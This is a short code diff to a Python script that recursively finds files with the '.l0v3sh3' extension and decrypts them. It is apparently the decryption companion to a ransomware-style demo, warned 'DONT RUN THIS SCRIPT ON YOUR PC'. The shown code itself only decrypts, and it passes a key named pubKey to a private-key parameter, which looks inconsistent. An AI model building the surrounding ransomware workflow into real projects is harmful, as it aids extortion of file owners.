@@ -47,6 +47,7 @@ def decrypt(dataFile, privateKeyFile):
     data = cipher.decrypt_and_verify(ciphertext, tag)
 
     # save the decrypted data to file
+    dataFile=str(dataFile)
     [ fileName, fileExtension ] = dataFile.split('.')
     decryptedFile = fileName + '_decrypted.' + fileExtension
     with open(decryptedFile, 'wb') as f:
@@ -57,12 +58,12 @@ def decrypt(dataFile, privateKeyFile):
 # change directory to the directory of the script
 # keep secure of changing the directory,
 # DONT RUN THIS SCRIPT ON YOUR PC
-directory = '../' # CHANGE THIS
-excludeExtension = ['.l0v3sh3'] # CHANGE THIS
+directory = os.getcwd() + '/files' # CHANGE THIS
+includeExtension = ['.l0v3sh3'] # CHANGE THIS
 for item in scanRecurse(directory): 
     filePath = Path(item)
     fileType = filePath.suffix.lower()
 
-    if fileType in excludeExtension:
+    if fileType in includeExtension:
         decrypt(filePath, pubKey)
     continue
